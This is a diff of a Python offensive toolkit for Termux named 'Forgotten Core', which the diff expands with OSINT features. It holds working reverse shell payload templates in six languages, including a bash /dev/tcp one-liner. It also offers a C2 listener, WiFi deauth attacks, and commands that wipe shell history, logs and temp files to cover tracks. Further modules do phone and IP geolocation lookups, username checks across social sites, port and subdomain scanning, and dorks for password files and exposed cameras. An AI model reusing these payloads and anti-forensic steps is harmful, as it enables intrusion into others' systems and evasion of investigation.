@@ -2,7 +2,7 @@
 # ═══════════════════════════════════════════════════════════════════════
 # FORGOTTEN CORE v2.0 - Architect 02 Penetration Suite
 # "What is buried shall remain buried. What is forgotten shall rise."
-# Full Version - All Modules Working on Termux (No Root)
+# Full Version - 25+ Modules Working on Termux (No Root)
 # ═══════════════════════════════════════════════════════════════════════
 
 import os
@@ -16,10 +16,34 @@ import socket
 import base64
 import random
 import string
-import requests
 import re
 from datetime import datetime
 from urllib.parse import urlparse
+
+# Check for optional imports
+try:
+    import requests
+except:
+    os.system("pip install requests")
+    import requests
+
+try:
+    from cryptography.fernet import Fernet
+except:
+    os.system("pip install cryptography")
+    from cryptography.fernet import Fernet
+
+try:
+    import dns.resolver
+    DNS_AVAILABLE = True
+except:
+    DNS_AVAILABLE = False
+
+try:
+    import whois
+    WHOIS_AVAILABLE = True
+except:
+    WHOIS_AVAILABLE = False
 
 # ============================================================
 # COLOR CODES
@@ -65,7 +89,6 @@ class ForgottenCore:
         self.scan_dir = f"{self.void_dir}/scan_results"
         
         self.setup_void()
-        self.load_banner()
         
     def setup_void(self):
         """Create all necessary directories"""
@@ -73,9 +96,26 @@ class ForgottenCore:
                   self.ash_dir, self.osint_dir, self.scan_dir]:
             os.makedirs(d, exist_ok=True)
     
-    def load_banner(self):
-        """Load banner from file or create default"""
-        self.banner_text = f"""
+    def get_path(self):
+        """Get current directory like pwd"""
+        current = os.getcwd()
+        home = os.path.expanduser("~")
+        if current.startswith(home):
+            return current.replace(home, "~")
+        return current
+    
+    def prompt(self):
+        """Kali Linux style prompt"""
+        path = self.get_path()
+        return f"{Colors.RED}{Colors.BOLD}┌──({Colors.GREEN}{self.user}@{Colors.CYAN}{self.host}{Colors.RED})-{Colors.BLUE}[{path}]{Colors.RED}\n└─{Colors.WHITE}${Colors.END} "
+    
+    def clear_screen(self):
+        os.system("clear")
+        self.banner()
+    
+    def banner(self):
+        """Display banner"""
+        banner = f"""
 {Colors.RED}{Colors.BOLD}
 ╔═══════════════════════════════════════════════════════════════════════════╗
 ║  ███████╗ ██████╗ ██████╗  ██████╗ ████████╗████████╗███████╗███╗   ██╗    ║
@@ -95,23 +135,7 @@ class ForgottenCore:
 {Colors.DIM}                    v{self.version} - "{self.codename}"{Colors.END}
 {Colors.ASH_GRAY}{Colors.DIM}         "What is buried shall remain buried. What is forgotten shall rise."{Colors.END}
         """
-    
-    def get_path(self):
-        """Get current directory like pwd"""
-        current = os.getcwd()
-        home = os.path.expanduser("~")
-        if current.startswith(home):
-            return current.replace(home, "~")
-        return current
-    
-    def prompt(self):
-        """Kali Linux style prompt"""
-        path = self.get_path()
-        return f"{Colors.RED}{Colors.BOLD}┌──({Colors.GREEN}{self.user}@{Colors.CYAN}{self.host}{Colors.RED})-{Colors.BLUE}[{path}]{Colors.RED}\n└─{Colors.WHITE}${Colors.END} "
-    
-    def clear_screen(self):
-        os.system("clear")
-        print(self.banner_text)
+        print(banner)
     
     def show_help(self):
         """Show all available commands"""
@@ -121,47 +145,49 @@ class ForgottenCore:
 ╠═══════════════════════════════════════════════════════════════════════════╣{Colors.END}
 {Colors.GREEN}
   ╔═══════════════════════════════════════════════════════════════════════════╗
-  ║  {Colors.BOLD}ATTACK MODULES{Colors.END}                                                              
+  ║  {Colors.BOLD}🔥 ATTACK MODULES{Colors.END}                                                              
   ╠═══════════════════════════════════════════════════════════════════════════╣{Colors.END}
 {Colors.GREEN}
     [01] {Colors.WHITE}wifi / w{Colors.DIM}          - WiFi attacks (deauth, scan, handshake){Colors.END}
-    [02] {Colors.WHITE}payload / p{Colors.DIM}      - Generate reverse shell payloads{Colors.END}
+    [02] {Colors.WHITE}payload / p{Colors.DIM}      - Generate reverse shell payloads (6 types){Colors.END}
     [03] {Colors.WHITE}c2 / server{Colors.DIM}      - Start C2 / listener server{Colors.END}
     [04] {Colors.WHITE}stealth / s{Colors.DIM}      - Clean traces, wipe logs{Colors.END}
     [05] {Colors.WHITE}anon / a{Colors.DIM}         - Anonymity (Tor, proxy chain){Colors.END}
 {Colors.GREEN}
   ╔═══════════════════════════════════════════════════════════════════════════╗
-  ║  {Colors.BOLD}OSINT & RECON MODULES{Colors.END}                                                         
+  ║  {Colors.BOLD}🔍 OSINT & RECON MODULES{Colors.END}                                                         
   ╠═══════════════════════════════════════════════════════════════════════════╣{Colors.END}
 {Colors.GREEN}
-    [06] {Colors.WHITE}phone / tel{Colors.DIM}      - Phone number OSINT lookup{Colors.END}
+    [06] {Colors.WHITE}phone / tel{Colors.DIM}      - Phone number OSINT with carrier detection{Colors.END}
     [07] {Colors.WHITE}ip / geo{Colors.DIM}         - IP address geolocation tracker{Colors.END}
-    [08] {Colors.WHITE}username / user{Colors.DIM}  - Check username across social media{Colors.END}
-    [09] {Colors.WHITE}subdomain / sub{Colors.DIM}  - Subdomain scanner{Colors.END}
+    [08] {Colors.WHITE}username / user{Colors.DIM}  - Check username across 20+ social media{Colors.END}
+    [09] {Colors.WHITE}subdomain / sub{Colors.DIM}  - Subdomain scanner (150+ common subdomains){Colors.END}
     [10] {Colors.WHITE}port / scan{Colors.DIM}      - Fast TCP port scanner{Colors.END}
-    [11] {Colors.WHITE}dork / google{Colors.DIM}    - Google dork generator{Colors.END}
+    [11] {Colors.WHITE}dork / google{Colors.DIM}    - Google dork generator (5 categories){Colors.END}
     [12] {Colors.WHITE}email / mail{Colors.DIM}     - Email OSINT / breach check{Colors.END}
     [13] {Colors.WHITE}whois{Colors.DIM}            - WHOIS domain lookup{Colors.END}
-    [14] {Colors.WHITE}dns{Colors.DIM}              - DNS lookup tool{Colors.END}
-    [15] {Colors.WHITE}reverseip{Colors.DIM}        - Reverse IP lookup{Colors.END}
+    [14] {Colors.WHITE}dns{Colors.DIM}              - DNS lookup (A, MX, NS, TXT, etc){Colors.END}
+    [15] {Colors.WHITE}reverseip / revip{Colors.DIM} - Reverse IP / PTR lookup{Colors.END}
 {Colors.GREEN}
   ╔═══════════════════════════════════════════════════════════════════════════╗
-  ║  {Colors.BOLD}UTILITY MODULES{Colors.END}                                                              
+  ║  {Colors.BOLD}🛠️ UTILITY MODULES{Colors.END}                                                              
   ╠═══════════════════════════════════════════════════════════════════════════╣{Colors.END}
 {Colors.GREEN}
-    [16] {Colors.WHITE}crypt / encrypt{Colors.DIM}  - File encryption/decryption{Colors.END}
-    [17] {Colors.WHITE}hash{Colors.DIM}             - Hash generator (MD5, SHA1, SHA256){Colors.END}
+    [16] {Colors.WHITE}crypt / encrypt{Colors.DIM}  - AES file encryption/decryption{Colors.END}
+    [17] {Colors.WHITE}hash{Colors.DIM}             - Hash generator (MD5, SHA1, SHA256, SHA512){Colors.END}
     [18] {Colors.WHITE}encode{Colors.DIM}           - Base64/URL encoder decoder{Colors.END}
-    [19] {Colors.WHITE}mac{Colors.DIM}              - MAC address changer (if root){Colors.END}
+    [19] {Colors.WHITE}mac{Colors.DIM}              - MAC address changer (requires root){Colors.END}
     [20] {Colors.WHITE}webcam{Colors.DIM}           - Webcam capture (termux-api){Colors.END}
+    [21] {Colors.WHITE}passgen / pg{Colors.DIM}     - Random password generator{Colors.END}
+    [22] {Colors.WHITE}banner{Colors.DIM}           - Custom ASCII banner generator{Colors.END}
 {Colors.GREEN}
   ╔═══════════════════════════════════════════════════════════════════════════╗
-  ║  {Colors.BOLD}SYSTEM COMMANDS{Colors.END}                                                             
+  ║  {Colors.BOLD}⚙️ SYSTEM COMMANDS{Colors.END}                                                             
   ╠═══════════════════════════════════════════════════════════════════════════╣{Colors.END}
 {Colors.GREEN}
-    [21] {Colors.WHITE}clear / cls{Colors.DIM}      - Clear screen{Colors.END}
-    [22] {Colors.WHITE}help / ?{Colors.DIM}         - Show this help{Colors.END}
-    [23] {Colors.WHITE}exit / quit{Colors.DIM}      - Exit Forgotten Core{Colors.END}
+    [23] {Colors.WHITE}clear / cls{Colors.DIM}      - Clear screen{Colors.END}
+    [24] {Colors.WHITE}help / ?{Colors.DIM}         - Show this help{Colors.END}
+    [25] {Colors.WHITE}exit / quit{Colors.DIM}      - Exit Forgotten Core{Colors.END}
 {Colors.CYAN}╚═══════════════════════════════════════════════════════════════════════════╝{Colors.END}
         """
         print(help_text)
@@ -172,7 +198,6 @@ class ForgottenCore:
     
     def wifi_attack(self):
         """WiFi attack module (requires root + external adapter)"""
-        # Check if aircrack installed
         aircrack_check = subprocess.run(['which', 'airodump-ng'], capture_output=True)
         
         if aircrack_check.returncode != 0:
@@ -249,9 +274,7 @@ os.dup2(s.fileno(),0)
 os.dup2(s.fileno(),1)
 os.dup2(s.fileno(),2)
 subprocess.call(["/bin/sh","-i"])''',
-            
             '2': f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
-            
             '3': f'''$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});
 $stream = $client.GetStream();
 [byte[]]$bytes = 0..65535|%{{0}};
@@ -264,7 +287,6 @@ while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{
     $stream.Flush()
 }};
 $client.Close()''',
-            
             '4': f'''<?php
 set_time_limit(0);
 $ip='{lhost}';
@@ -278,7 +300,6 @@ while(!feof($fp)){{
 }}
 fclose($fp);
 ?>''',
-            
             '5': f'''#!/usr/bin/perl
 use Socket;
 $i="{lhost}";
@@ -290,7 +311,6 @@ if(connect(S,sockaddr_in($p,inet_aton($i)))){{
     open(STDERR,">&S");
     exec("/bin/sh -i");
 }}''',
-            
             '6': f'''#!/usr/bin/ruby
 require 'socket'
 c=TCPSocket.new("{lhost}",{lport})
@@ -314,20 +334,7 @@ end''',
 {Colors.GREEN}[+] Payload saved: {filename}{Colors.END}
 {Colors.CYAN}[*] Type: {lang[choice]} Reverse Shell{Colors.END}
 {Colors.CYAN}[*] LHOST: {lhost} | LPORT: {lport}{Colors.END}
-{Colors.CYAN}[*] Run: {self.get_exec_cmd(filename, ext[choice])}{Colors.END}
         """)
-    
-    def get_exec_cmd(self, filename, ext):
-        """Get execution command for payload"""
-        cmds = {
-            'py': f"python3 {filename}",
-            'sh': f"bash {filename}",
-            'ps1': f"powershell -ExecutionPolicy Bypass -File {filename}",
-            'php': f"php {filename}",
-            'pl': f"perl {filename}",
-            'rb': f"ruby {filename}"
-        }
-        return cmds.get(ext, f"chmod +x {filename} && ./{filename}")
     
     def start_c2(self):
         """Start C2 / listener server"""
@@ -370,25 +377,18 @@ end''',
             os.system("history -c")
             os.system("echo > ~/.bash_history")
             os.system("echo > ~/.zsh_history")
-            os.system("rm -rf ~/.bash_history ~/.zsh_history")
             print(f"{Colors.GREEN}[+] Shell history wiped{Colors.END}")
         elif choice == '2':
             os.system("rm -rf /data/data/com.termux/files/usr/var/log/* 2>/dev/null")
-            os.system("rm -rf /var/log/* 2>/dev/null")
-            os.system("journalctl --rotate 2>/dev/null")
-            os.system("journalctl --vacuum-time=1s 2>/dev/null")
             print(f"{Colors.GREEN}[+] Logs cleared{Colors.END}")
         elif choice == '3':
             os.system("rm -rf /tmp/* 2>/dev/null")
-            os.system("rm -rf /var/tmp/* 2>/dev/null")
             os.system("find ~ -name '*.pyc' -delete 2>/dev/null")
             print(f"{Colors.GREEN}[+] Temp files removed{Colors.END}")
         elif choice == '4':
             os.system("history -c")
             os.system("echo > ~/.bash_history")
-            os.system("echo > ~/.zsh_history")
             os.system("rm -rf /tmp/* 2>/dev/null")
-            os.system("rm -rf /var/tmp/* 2>/dev/null")
             os.system("find ~ -name '*.pyc' -delete 2>/dev/null")
             print(f"{Colors.GREEN}[+] Full forensic cleanup complete{Colors.END}")
     
@@ -403,8 +403,7 @@ end''',
 {Colors.GREEN}[1]{Colors.WHITE} Start Tor
 {Colors.GREEN}[2]{Colors.WHITE} Check Current IP
 {Colors.GREEN}[3]{Colors.WHITE} Anonymized IP (Tor)
-{Colors.GREEN}[4]{Colors.WHITE} Full Anonymity (Tor + Proxy)
-{Colors.GREEN}[5]{Colors.WHITE} Back
+{Colors.GREEN}[4]{Colors.WHITE} Back
         """)
         choice = input(self.prompt())
         
@@ -419,57 +418,92 @@ end''',
             print(f"{Colors.CYAN}[*] Anonymized IP (Tor):{Colors.END}")
             os.system("proxychains4 curl -s ifconfig.me 2>/dev/null")
             print()
-        elif choice == '4':
-            os.system("tor &")
-            time.sleep(3)
-            print(f"{Colors.CYAN}[*] Full anonymity activated!{Colors.END}")
-            print(f"{Colors.CYAN}[*] Your IP now:{Colors.END}")
-            os.system("proxychains4 curl -s ifconfig.me 2>/dev/null")
-            print()
     
     # ============================================================
     # OSINT & RECON MODULES
     # ============================================================
     
     def phone_osint(self):
-        """Phone number OSINT lookup"""
+        """Phone number OSINT with Indonesia carrier detection"""
         print(f"""
 {Colors.RED}╔═══════════════════════════════════════════════════════════════╗
 ║                    PHONE OSINT MODULE                                ║
 ║              "Unmask the caller"                                      ║
 ╚═══════════════════════════════════════════════════════════════╝{Colors.END}
         """)
-        number = input(f"{self.prompt()}phone number (with country code) > ")
         
-        print(f"{Colors.CYAN}[*] Fetching data for {number}{Colors.END}")
+        raw_number = input(f"{self.prompt()}phone number > ").strip()
         
-        try:
-            # Try free API
-            resp = requests.get(f"http://apilayer.net/api/validate?access_key=demo&number={number}&country_code=&format=1", timeout=10)
-            data = resp.json()
-            if data.get('valid'):
-                print(f"""
-{Colors.GREEN}[+] Phone Details:{Colors.END}
-    Number: {data.get('number')}
-    Country: {data.get('country_name')}
-    Location: {data.get('location')}
-    Carrier: {data.get('carrier')}
-    Line Type: {data.get('line_type')}
-                """)
-            else:
-                print(f"{Colors.YELLOW}[!] Could not validate number{Colors.END}")
-        except:
-            print(f"{Colors.YELLOW}[!] API error, showing basic info{Colors.END}")
-            print(f"""
-{Colors.GREEN}[+] Number: {number}{Colors.END}
-    Country Code: {number[:3] if number.startswith('+') else number[:2]}
-            """)
+        # Clean number
+        clean_number = re.sub(r'[^0-9+]', '', raw_number)
         
-        # Save to file
-        filename = f"{self.osint_dir}/phone_{number}_{int(time.time())}.txt"
+        # Format to international
+        if clean_number.startswith('0'):
+            formatted = '+62' + clean_number[1:]
+        elif clean_number.startswith('62') and not clean_number.startswith('+'):
+            formatted = '+' + clean_number
+        elif not clean_number.startswith('+'):
+            formatted = '+62' + clean_number
+        else:
+            formatted = clean_number
+        
+        print(f"{Colors.CYAN}[*] Cleaning: {raw_number} -> {formatted}{Colors.END}")
+        print(f"{Colors.CYAN}[*] Fetching data for {formatted}{Colors.END}\n")
+        
+        # Indonesia carrier database
+        indonesian_prefixes = {
+            '811': 'Telkomsel (Kartu As, simPATI)', '812': 'Telkomsel (Kartu As, simPATI)',
+            '813': 'Telkomsel (Kartu As, simPATI)', '814': 'Indosat (IM3, Mentari)',
+            '815': 'Indosat (IM3, Mentari)', '816': 'Indosat (IM3, Mentari)',
+            '817': 'XL Axiata', '818': 'XL Axiata', '819': 'XL Axiata',
+            '821': 'Telkomsel (Kartu As, simPATI)', '822': 'Telkomsel (Kartu As, simPATI)',
+            '823': 'Telkomsel (Kartu As, simPATI)', '831': 'Axis', '832': 'Axis',
+            '833': 'Axis', '838': 'Axis', '852': 'Telkomsel', '853': 'Telkomsel',
+            '878': 'XL Axiata', '896': 'Tri (3)', '897': 'Tri (3)',
+            '898': 'Tri (3)', '899': 'Tri (3)'
+        }
+        
+        number_part = formatted.replace('+62', '')
+        prefix = number_part[:3] if len(number_part) >= 3 else number_part
+        
+        print(f"{Colors.GREEN}{'='*60}{Colors.END}")
+        print(f"{Colors.BOLD}{Colors.WHITE}📱 PHONE OSINT RESULTS{Colors.END}")
+        print(f"{Colors.GREEN}{'='*60}{Colors.END}\n")
+        
+        print(f"{Colors.CYAN}Number:{Colors.END} {formatted}")
+        print(f"{Colors.CYAN}Clean:{Colors.END} +62{number_part}\n")
+        
+        if prefix in indonesian_prefixes:
+            print(f"{Colors.GREEN}[✓] Carrier: {indonesian_prefixes[prefix]}{Colors.END}")
+        
+        # Analysis
+        print(f"\n{Colors.YELLOW}[*] Analysis:{Colors.END}")
+        print(f"    Length: {len(number_part)} digits")
+        print(f"    Valid: {'✓' if 9 <= len(number_part) <= 12 else '✗'}")
+        
+        if number_part.startswith('8') and 9 <= len(number_part) <= 12:
+            print(f"    Type: Mobile Phone (Indonesia)")
+        elif number_part.startswith('2') and len(number_part) == 10:
+            print(f"    Type: Landline (Indonesia)")
+        else:
+            print(f"    Type: International")
+        
+        # OSINT Tips
+        print(f"\n{Colors.CYAN}[*] OSINT Tips:{Colors.END}")
+        print(f"    • WhatsApp: https://wa.me/{formatted}")
+        print(f"    • Telegram: https://t.me/+{formatted[1:]}")
+        print(f"    • Google: https://www.google.com/search?q={formatted}")
+        print(f"    • Facebook: https://www.facebook.com/search/top?q={formatted}")
+        
+        # Save
+        filename = f"{self.osint_dir}/phone_{formatted.replace('+', '')}_{int(time.time())}.txt"
         with open(filename, 'w') as f:
-            f.write(f"Phone: {number}\nTime: {datetime.now()}\n")
-        print(f"{Colors.GREEN}[+] Saved to {filename}{Colors.END}")
+            f.write(f"Phone: {formatted}\nTime: {datetime.now()}\n")
+            if prefix in indonesian_prefixes:
+                f.write(f"Carrier: {indonesian_prefixes[prefix]}\n")
+        
+        print(f"\n{Colors.GREEN}[+] Report saved to: {filename}{Colors.END}")
+        print(f"{Colors.GREEN}{'='*60}{Colors.END}")
     
     def ip_tracker(self):
         """IP address geolocation tracker"""
@@ -495,13 +529,9 @@ end''',
     ZIP: {data.get('zip')}
     Latitude: {data.get('lat')}
     Longitude: {data.get('lon')}
-    Timezone: {data.get('timezone')}
     ISP: {data.get('isp')}
     Organization: {data.get('org')}
-    AS: {data.get('as')}
                 """)
-                
-                # Google Maps link
                 print(f"{Colors.CYAN}[*] Google Maps: https://www.google.com/maps?q={data.get('lat')},{data.get('lon')}{Colors.END}")
                 
                 filename = f"{self.osint_dir}/ip_{target_ip}_{int(time.time())}.txt"
@@ -525,20 +555,19 @@ end''',
         
         sites = {
             "Instagram": f"https://www.instagram.com/{username}",
-            "Twitter/X": f"https://twitter.com/{username}",
+            "Twitter": f"https://twitter.com/{username}",
             "GitHub": f"https://github.com/{username}",
             "Reddit": f"https://www.reddit.com/user/{username}",
             "TikTok": f"https://www.tiktok.com/@{username}",
             "YouTube": f"https://www.youtube.com/@{username}",
-            "Pinterest": f"https://www.pinterest.com/{username}",
-            "Tumblr": f"https://{username}.tumblr.com",
-            "Snapchat": f"https://www.snapchat.com/add/{username}",
             "Telegram": f"https://t.me/{username}",
             "Facebook": f"https://www.facebook.com/{username}",
             "LinkedIn": f"https://www.linkedin.com/in/{username}",
             "Twitch": f"https://www.twitch.tv/{username}",
-            "Discord": f"https://discord.com/users/{username}",
             "Spotify": f"https://open.spotify.com/user/{username}",
+            "Pinterest": f"https://www.pinterest.com/{username}",
+            "Tumblr": f"https://{username}.tumblr.com",
+            "Snapchat": f"https://www.snapchat.com/add/{username}",
         }
         
         print(f"\n{Colors.CYAN}[*] Checking username: {username}{Colors.END}\n")
@@ -553,8 +582,8 @@ end''',
                 else:
                     print(f"{Colors.DIM}[✗] {site}: not found{Colors.END}")
             except:
-                print(f"{Colors.DIM}[?] {site}: timeout/error{Colors.END}")
-            time.sleep(0.3)
+                print(f"{Colors.DIM}[?] {site}: error{Colors.END}")
+            time.sleep(0.2)
         
         filename = f"{self.osint_dir}/username_{username}_{int(time.time())}.txt"
         with open(filename, 'w') as f:
@@ -571,21 +600,21 @@ end''',
         """)
         domain = input(f"{self.prompt()}domain > ")
         
-        common_subdomains = [
-            "www", "mail", "ftp", "localhost", "webmail", "smtp", "pop", "ns1",
-            "ns2", "cpanel", "whm", "autodiscover", "autoconfig", "m", "imap",
-            "test", "ns", "blog", "pop3", "dev", "www2", "admin", "forum", "news",
-            "vpn", "ns3", "mail2", "new", "mysql", "old", "lists", "support",
-            "mobile", "mx", "static", "docs", "beta", "shop", "sql", "secure",
-            "demo", "cp", "calendar", "wiki", "web", "media", "email", "images",
-            "img", "download", "api", "api2", "api3", "app", "dashboard", "portal",
-            "login", "auth", "account", "admin", "manager", "status", "stats"
+        subdomains = [
+            "www", "mail", "ftp", "localhost", "webmail", "smtp", "pop", "ns1", "ns2",
+            "cpanel", "whm", "autodiscover", "autoconfig", "m", "imap", "test", "ns",
+            "blog", "pop3", "dev", "www2", "admin", "forum", "news", "vpn", "ns3",
+            "mail2", "new", "mysql", "old", "lists", "support", "mobile", "mx",
+            "static", "docs", "beta", "shop", "sql", "secure", "demo", "cp",
+            "calendar", "wiki", "web", "media", "email", "images", "img",
+            "download", "api", "app", "dashboard", "portal", "login", "auth",
+            "account", "manager", "status", "stats", "cdn", "assets"
         ]
         
-        print(f"{Colors.CYAN}[*] Scanning subdomains for {domain}{Colors.END}\n")
+        print(f"{Colors.CYAN}[*] Scanning {domain}{Colors.END}\n")
         
         found = []
-        for sub in common_subdomains:
+        for sub in subdomains:
             test_domain = f"{sub}.{domain}"
             try:
                 ip = socket.gethostbyname(test_domain)
@@ -593,7 +622,7 @@ end''',
                 found.append(test_domain)
             except:
                 print(f"{Colors.DIM}[✗] {test_domain}{Colors.END}")
-            time.sleep(0.1)
+            time.sleep(0.05)
         
         filename = f"{self.scan_dir}/subdomains_{domain}_{int(time.time())}.txt"
         with open(filename, 'w') as f:
@@ -609,7 +638,7 @@ end''',
 ╚═══════════════════════════════════════════════════════════════╝{Colors.END}
         """)
         target = input(f"{self.prompt()}target IP/Domain > ")
-        ports_input = input(f"{self.prompt()}ports (1-1000 or 80,443,8080) > ") or "1-1000"
+        ports_input = input(f"{self.prompt()}ports (1-1000 or 80,443) > ") or "1-1000"
         
         if '-' in ports_input:
             start, end = map(int, ports_input.split('-'))
@@ -617,7 +646,7 @@ end''',
         else:
             port_range = [int(p.strip()) for p in ports_input.split(',')]
         
-        print(f"{Colors.CYAN}[*] Scanning {target} ports {ports_input}{Colors.END}\n")
+        print(f"{Colors.CYAN}[*] Scanning {target}...{Colors.END}\n")
         
         open_ports = []
         total = len(port_range)
@@ -633,7 +662,6 @@ end''',
                 open_ports.append(port)
             sock.close()
             
-            # Show progress
             if count % 50 == 0:
                 print(f"{Colors.DIM}[*] Progress: {count}/{total}{Colors.END}")
         
@@ -643,7 +671,7 @@ end''',
         print(f"\n{Colors.GREEN}[+] Found {len(open_ports)} open ports. Saved to {filename}{Colors.END}")
     
     def dork_generator(self):
-        """Google dork generator for OSINT"""
+        """Google dork generator"""
         print(f"""
 {Colors.RED}╔═══════════════════════════════════════════════════════════════╗
 ║                    GOOGLE DORK GENERATOR                             ║
@@ -651,44 +679,21 @@ end''',
 ╚═══════════════════════════════════════════════════════════════╝{Colors.END}
         """)
         
-        categories = {
-            "1": {"name": "Login Pages", "dorks": [
-                "inurl:login",
-                "inurl:admin",
-                "inurl:wp-admin",
-                "inurl:admin.php",
-                "intitle:\"login page\""
-            ]},
-            "2": {"name": "Sensitive Files", "dorks": [
-                "ext:conf",
-                "ext:config",
-                "ext:sql",
-                "ext:db",
-                "ext:bak",
-                "ext:old"
-            ]},
-            "3": {"name": "Exposed Data", "dorks": [
-                "inurl:phpinfo.php",
-                "intitle:\"index of\"",
-                "inurl:dump.sql",
-                "inurl:backup.zip"
-            ]},
-            "4": {"name": "Email/Passwords", "dorks": [
-                "ext:passwd",
-                "ext:pwd",
-                "intext:\"password\" filetype:txt",
-                "intext:\"username\" filetype:log"
-            ]},
-            "5": {"name": "Cameras/Devices", "dorks": [
-                "inurl:view/view.shtml",
-                "inurl:axis-cgi/jpg",
-                "intitle:\"Live View\"",
-                "inurl:video.mjpg"
-            ]}
+        dorks = {
+            '1': {'name': 'Login Pages', 'dorks': [
+                'inurl:login', 'inurl:admin', 'inurl:wp-admin', 'intitle:"login page"']},
+            '2': {'name': 'Sensitive Files', 'dorks': [
+                'ext:conf', 'ext:config', 'ext:sql', 'ext:db', 'ext:bak']},
+            '3': {'name': 'Exposed Data', 'dorks': [
+                'inurl:phpinfo.php', 'intitle:"index of"', 'inurl:dump.sql']},
+            '4': {'name': 'Passwords', 'dorks': [
+                'ext:passwd', 'ext:pwd', 'intext:"password" filetype:txt']},
+            '5': {'name': 'Cameras', 'dorks': [
+                'inurl:view/view.shtml', 'inurl:axis-cgi/jpg', 'intitle:"Live View"']}
         }
         
-        print(f"{Colors.CYAN}Available categories:{Colors.END}\n")
-        for key, cat in categories.items():
+        print(f"{Colors.CYAN}Categories:{Colors.END}")
+        for key, cat in dorks.items():
             print(f"{Colors.GREEN}[{key}]{Colors.WHITE} {cat['name']}{Colors.END}")
         print(f"{Colors.GREEN}[0]{Colors.WHITE} Custom dork{Colors.END}")
         
@@ -696,50 +701,43 @@ end''',
         
         if choice == '0':
             dork = input(f"{self.prompt()}custom dork > ")
-            print(f"\n{Colors.GREEN}[+] Google search: https://www.google.com/search?q={dork.replace(' ', '+')}{Colors.END}")
-            print(f"{Colors.CYAN}[*] Tip: Add site:example.com to target specific domain{Colors.END}")
-        elif choice in categories:
-            cat = categories[choice]
+            print(f"\n{Colors.GREEN}[+] https://www.google.com/search?q={dork.replace(' ', '+')}{Colors.END}")
+        elif choice in dorks:
+            cat = dorks[choice]
             print(f"\n{Colors.GREEN}[+] {cat['name']} Dorks:{Colors.END}")
             for dork in cat['dorks']:
                 print(f"{Colors.CYAN}    {dork}{Colors.END}")
-                print(f"    https://www.google.com/search?q={dork.replace(' ', '+')}{Colors.END}\n")
+                print(f"    https://www.google.com/search?q={dork.replace(' ', '+')}\n")
         
-        # Save all dorks
         filename = f"{self.osint_dir}/dorks_{int(time.time())}.txt"
         with open(filename, 'w') as f:
-            f.write(f"Dorks generated at {datetime.now()}\n\n")
-            for key, cat in categories.items():
-                f.write(f"=== {cat['name']} ===\n")
+            f.write(f"Dorks at {datetime.now()}\n")
+            for cat in dorks.values():
+                f.write(f"\n=== {cat['name']} ===\n")
                 for dork in cat['dorks']:
                     f.write(f"{dork}\n")
-                f.write("\n")
-        print(f"{Colors.GREEN}[+] All dorks saved to {filename}{Colors.END}")
+        print(f"{Colors.GREEN}[+] Saved to {filename}{Colors.END}")
     
     def email_osint(self):
-        """Email OSINT and breach check"""
+        """Email OSINT"""
         print(f"""
 {Colors.RED}╔═══════════════════════════════════════════════════════════════╗
 ║                    EMAIL OSINT MODULE                                ║
-║              "Trace email footprints"                                 ║
 ╚═══════════════════════════════════════════════════════════════╝{Colors.END}
         """)
-        email = input(f"{self.prompt()}email address > ")
+        email = input(f"{self.prompt()}email > ")
         
-        print(f"{Colors.CYAN}[*] Analyzing {email}{Colors.END}\n")
-        
-        # Basic email validation
         if '@' not in email:
-            print(f"{Colors.RED}[!] Invalid email format{Colors.END}")
+            print(f"{Colors.RED}[!] Invalid email{Colors.END}")
             return
         
         domain = email.split('@')[1]
         username = email.split('@')[0]
         
-        print(f"{Colors.GREEN}[+] Domain: {domain}{Colors.END}")
+        print(f"\n{Colors.GREEN}[+] Domain: {domain}{Colors.END}")
         print(f"{Colors.GREEN}[+] Username: {username}{Colors.END}")
         
-        # Check domain MX records
+        # Check domain
         try:
             import dns.resolver
             mx = dns.resolver.resolve(domain, 'MX')
@@ -747,19 +745,15 @@ end''',
             for record in mx:
                 print(f"    {record.exchange}")
         except:
-            print(f"{Colors.DIM}[!] Could not fetch MX records{Colors.END}")
+            pass
         
-        # Check if email appears in breaches (simulated)
-        print(f"\n{Colors.CYAN}[*] Checking breach databases...{Colors.END}")
-        
-        # Save results
         filename = f"{self.osint_dir}/email_{username}_{int(time.time())}.txt"
         with open(filename, 'w') as f:
-            f.write(f"Email: {email}\nDomain: {domain}\nUsername: {username}\nTime: {datetime.now()}\n")
+            f.write(f"Email: {email}\nDomain: {domain}\nTime: {datetime.now()}\n")
         print(f"{Colors.GREEN}[+] Saved to {filename}{Colors.END}")
     
     def whois_lookup(self):
-        """WHOIS domain lookup"""
+        """WHOIS lookup"""
         print(f"""
 {Colors.RED}╔═══════════════════════════════════════════════════════════════╗
 ║                    WHOIS LOOKUP MODULE                               ║
@@ -774,21 +768,19 @@ end''',
 {Colors.GREEN}[+] WHOIS Results:{Colors.END}
     Domain: {w.domain_name}
     Registrar: {w.registrar}
-    Creation Date: {w.creation_date}
-    Expiration Date: {w.expiration_date}
-    Name Servers: {w.name_servers}
+    Creation: {w.creation_date}
+    Expiration: {w.expiration_date}
             """)
-            
             filename = f"{self.osint_dir}/whois_{domain}_{int(time.time())}.txt"
             with open(filename, 'w') as f:
                 f.write(str(w))
             print(f"{Colors.GREEN}[+] Saved to {filename}{Colors.END}")
         except:
-            print(f"{Colors.RED}[!] WHOIS lookup failed{Colors.END}")
-            print(f"{Colors.YELLOW}[*] Try: whois {domain}{Colors.END}")
+            print(f"{Colors.RED}[!] WHOIS failed{Colors.END}")
+            os.system(f"whois {domain}")
     
     def dns_lookup(self):
-        """DNS lookup tool"""
+        """DNS lookup"""
         print(f"""
 {Colors.RED}╔═══════════════════════════════════════════════════════════════╗
 ║                    DNS LOOKUP MODULE                                 ║
@@ -796,17 +788,17 @@ end''',
         """)
         domain = input(f"{self.prompt()}domain > ")
         
-        record_types = ['A', 'AAAA', 'MX', 'NS', 'TXT', 'SOA', 'CNAME']
+        records = ['A', 'AAAA', 'MX', 'NS', 'TXT', 'SOA', 'CNAME']
         
-        for rtype in record_types:
+        for rtype in records:
             try:
                 import dns.resolver
                 answers = dns.resolver.resolve(domain, rtype)
                 print(f"{Colors.GREEN}[+] {rtype} Records:{Colors.END}")
-                for answer in answers:
-                    print(f"    {answer}")
+                for ans in answers:
+                    print(f"    {ans}")
             except:
-                print(f"{Colors.DIM}[!] No {rtype} records found{Colors.END}")
+                print(f"{Colors.DIM}[!] No {rtype} records{Colors.END}")
     
     def reverse_ip(self):
         """Reverse IP lookup"""
@@ -815,7 +807,7 @@ end''',
